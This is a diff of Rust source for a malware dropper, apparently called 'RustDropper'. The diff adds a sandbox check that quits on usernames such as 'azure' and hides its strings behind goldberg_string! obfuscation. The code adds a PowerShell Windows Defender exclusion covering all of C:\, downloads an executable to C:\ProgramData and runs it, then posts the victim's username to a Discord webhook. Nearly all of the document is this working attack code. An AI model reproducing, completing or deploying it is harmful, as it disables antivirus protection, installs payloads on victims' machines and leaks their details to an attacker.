@@ -1,69 +1,87 @@
-use downloader::Downloader;
+use core::time::Duration;
+use downloader::{Download, Downloader};
+use goldberg::goldberg_string;
+use serenity::{http::Http, model::webhook::Webhook};
+use std::{path::Path, process::exit, process::Command, thread};
 // use std::io::{BufRead, BufReader};
-use std::process::Command;
-use serenity::http::Http;
-use serenity::model::webhook::Webhook;
 // use std::io::*;
 // use colored::*;
-use std::thread;
 
-const IMAGE_URL: &'static str = "https://cdn.discordapp.com/avatars/312157715449249795/a_b8b3b0c35f3dee2b6586a0dd58697e29.png";
-
-
-
-fn main(){
-    dwkjadhawjdawjhddwadj();
+fn main() {
+    njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge();
     d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h();
+    dwkjadhawjdawjhddwadj();
     fudjawjwuu8023848901284234823894209482308948238042380948234();
     send();
-   // nitrogen();    
+    // nitrogen();
 }
 
+fn njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge() {
+    let username = whoami::username();
+
+    let blacklisted_usernames = [
+        String::from(goldberg_string!("Frank")),
+        String::from(goldberg_string!("Joe Cage")),
+        String::from(goldberg_string!("george")),
+        String::from(goldberg_string!("azure")),
+        String::from(goldberg_string!("Abby")),
+    ];
+
+    for bl_username in blacklisted_usernames {
+        if bl_username == username {
+            exit(0);
+        }
+    }
+}
 
 fn dwkjadhawjdawjhddwadj() {
-    let url = "";
     let mut downloader = Downloader::builder()
-        .download_folder(std::path::Path::new("C:\\ProgramData"))
+        .download_folder(Path::new(&goldberg_string!("C:\\ProgramData")))
         .parallel_requests(1)
         .build()
         .unwrap();
 
+    let dl2 = Download::new(&goldberg_string!("url"));
 
-    let dl2 = downloader::Download::new(
-        url,
-    );
-
-    let result = downloader.download(&[dl2]).unwrap();
-
+    downloader.download(&[dl2]).unwrap();
 }
 
 fn d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h() {
-    Command::new("powershell.exe")
-    .args(["-C",r"Set-MpPreference -ExclusionPath C:\"])
-    .spawn()
-    .unwrap();
+    Command::new(goldberg_string!("powershell.exe"))
+        .args([
+            "-C",
+            goldberg_string!("Set-MpPreference -ExclusionPath C:\\"),
+        ])
+        .spawn()
+        .unwrap();
 
-    thread::sleep_ms(6000)
+    thread::sleep(Duration::from_millis(3000))
 }
 
 fn fudjawjwuu8023848901284234823894209482308948238042380948234() {
-    Command::new("cmd.exe")
-    .args(["/C",r"C:\ProgramData\HBpgdDw2341QpXZheU2Vq9FFxjGpEyYzTXdR0kSt5DZzp.exe"])
-    .spawn()
-    .unwrap();
-
-    
+    Command::new(goldberg_string!("cmd.exe"))
+        .args([
+            "/C",
+            goldberg_string!("C:\\ProgramData\\HBpgdDw2341QpXZheU2Vq9FFxjGpEyYzTXdR0kSt5DZzp.exe"),
+        ])
+        .spawn()
+        .unwrap();
 }
 
 #[tokio::main]
 async fn send() {
     let http = Http::new("");
-    let webhook = Webhook::from_url(&http, "https://discord.com/api/webhooks/").await.expect("Replace the webhook with your own");
+    let webhook = Webhook::from_url(&http, goldberg_string!("https://discord.com/api/webhooks/"))
+        .await
+        .expect(goldberg_string!("Replace the webhook with your own"));
 
     webhook
-        .execute(&http, false, |w| w.content(format!("**Windows User:** `{}`", whoami::username())).username("github.com/svg-rs/RustDropper"))
+        .execute(&http, false, |w| {
+            w.content(format!("User `{}`", whoami::username()))
+                .username(goldberg_string!("github.com/svg-rs/RustDropper"))
+        })
         .await
-        .expect("Could not execute webhook.");
+        .expect(goldberg_string!("Could not execute webhook."));
 }
 
 // fn nitrogen(){
@@ -97,5 +115,4 @@ async fn send() {
 //     }
 //     println!("Finished");
 //     main();
-// } 
-
+// }
